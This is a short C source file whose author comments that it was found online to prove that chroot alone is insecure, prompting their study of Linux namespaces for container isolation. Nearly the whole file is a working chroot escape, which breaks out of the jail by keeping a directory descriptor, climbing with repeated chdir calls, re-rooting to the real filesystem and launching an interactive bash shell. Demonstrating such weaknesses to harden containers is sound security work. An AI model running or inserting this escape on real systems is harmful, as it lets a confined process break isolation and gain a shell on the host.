// NOT MY CODE
// i found this online as a script to prove the insecurity of `chroot` on its own
// hence why i went down a rabbit hole about Linux namespaces for a week
// it should be completely impossible to break out from my containers!

#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");  
    return execl("/bin/bash", "-i", NULL);
}